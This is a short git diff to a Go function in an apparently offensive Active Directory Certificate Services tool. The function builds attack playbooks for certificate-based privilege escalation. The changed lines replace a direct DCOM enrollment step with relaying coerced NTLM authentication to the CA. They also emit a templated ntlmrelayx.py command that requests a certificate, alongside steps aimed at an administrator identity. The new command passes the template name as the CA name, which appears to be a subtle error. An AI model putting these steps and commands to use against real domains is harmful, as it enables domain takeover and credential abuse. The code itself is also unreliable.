@@ -191,10 +191,10 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 		return []string{
 			"Identify CA with DCOM endpoint mapper (port 135) remotely accessible",
 			"Confirm CA private key is stored on a network HSM or DCOM enrollment is unrestricted",
-			"Connect to ICertRequest DCOM interface on the CA server",
+			"Relay coerced NTLM auth to ICertRequest DCOM interface on the CA server",
 			"Request certificate via DCOM — bypasses web enrollment and RPC restrictions",
-			fmt.Sprintf("Command: certstrike pki --esc 12 --template %s --upn administrator@%s --target-dc %s --domain %s",
-				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+			fmt.Sprintf("Command: ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name %q -smb2support --template %s",
+				cfg.TargetDC, tmpl.Name, tmpl.Name),
 		}
 	case "ESC14":
 		return []string{
